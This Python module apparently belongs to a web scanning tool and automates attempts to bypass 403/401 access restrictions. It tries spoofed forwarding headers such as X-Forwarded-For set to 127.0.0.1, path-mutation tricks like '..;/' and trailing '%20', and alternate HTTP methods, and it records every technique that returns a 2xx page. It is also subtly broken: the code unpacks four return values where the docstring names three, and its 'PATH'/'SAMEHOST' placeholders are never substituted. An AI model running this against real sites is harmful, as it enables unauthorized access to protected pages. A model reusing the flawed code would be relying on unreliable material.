"""403/401 bypass techniques (standard, documented). Runs only against a hit."""
from urllib.parse import urljoin

# Header-based tricks. Values "PATH"/"SAMEHOST" are substituted at runtime.
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Original-URL": "PATH"},
    {"X-Rewrite-URL": "PATH"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"Referer": "SAMEHOST"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Proto": "https"},
]


def path_variants(path):
    """Path-mutation tricks for a given absolute path like '/admin'."""
    p = path.lstrip("/")
    return [
        f"/{p}/",          # trailing slash
        f"/{p}/.",         # /path/.
        f"//{p}//",        # double slash
        f"/./{p}",         # /./path
        f"/{p}%20",        # trailing space
        f"/{p}%09",        # trailing tab
        f"/{p}?",          # dangling query
        f"/{p}#",          # fragment
        f"/{p}..;/",       # ..;/  (Tomcat/nginx path confusion)
        f"/{p};/",         # ;/
        f"/{p}.json",      # extension confusion
        f"/{p.upper()}",   # case
    ]

# a bypass only counts if we actually got the content (2xx). 405/400/3xx-to-login are NOT wins.
OK = lambda st: st is not None and 200 <= st < 300


def try_bypass(fetcher, url, path):
    """Return list of (technique, status) that escaped a 403/401. `fetcher.get`
    is (url, method=, extra=) -> (status, length, body)."""
    wins = []
    for hdr in BYPASS_HEADERS:
        st, _, _, _ = fetcher.get(url, extra=hdr)
        if OK(st):
            wins.append((f"header {'+'.join(hdr)}", st))
    root = url[: url.rfind(path)] if path in url else url.rstrip("/")
    for v in path_variants(path):
        st, _, _, _ = fetcher.get(urljoin(root + "/", v.lstrip("/")))
        if OK(st):
            wins.append((f"path {v}", st))
    for m in ("POST", "TRACE", "OPTIONS", "PATCH"):
        st, _, _, _ = fetcher.get(url, method=m)
        if OK(st):
            wins.append((f"method {m}", st))
    return wins
